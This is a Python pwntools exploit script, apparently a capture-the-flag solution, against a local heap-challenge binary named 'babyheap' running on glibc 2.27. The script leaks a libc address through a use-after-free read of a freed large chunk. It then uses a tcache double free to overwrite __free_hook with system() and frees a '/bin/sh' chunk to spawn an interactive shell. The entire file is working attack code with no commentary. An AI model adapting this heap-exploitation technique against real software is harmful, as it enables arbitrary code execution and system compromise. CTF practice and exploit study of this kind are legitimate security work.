from pwn import *

elf = ELF("./babyheap")
libc = ELF("./libc/libc-2.27.so")
ld = ELF("./libc/ld-2.27.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})

def sa(s, d):
	target.sendafter(s, d)

def sla(s, d):
	sa(s, d+"\n")

def add(idx, size, data):
	sla("Exit\n", "1")
	sla("?\n", str(size))
	sla("?\n", str(idx))
	sa("?\n", data)

def show(idx):
	sla("Exit\n", "2")
	sla("?\n", str(idx))
	target.recvuntil(":\n")

def free(idx):
	sla("Exit\n", "3")
	sla("?\n", str(idx))

add(7, 0x420, "B"*8)
chunk_sz = 0x80
add(0, chunk_sz, "A"*8)
add(1, chunk_sz, "A"*8)

free(7)
show(7)
libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - (0x7ff3c856bca0 - 0x7ff3c8180000)
log.info(hex(libc_base))

free(0)
free(1)
free(0)

add(2, chunk_sz, p64(libc_base + libc.sym['__free_hook']))
add(3, chunk_sz, "A"*8)
add(4, chunk_sz, "/bin/sh\x00")
add(5, chunk_sz, p64(libc_base + libc.sym['system']))

free(4)

target.interactive()
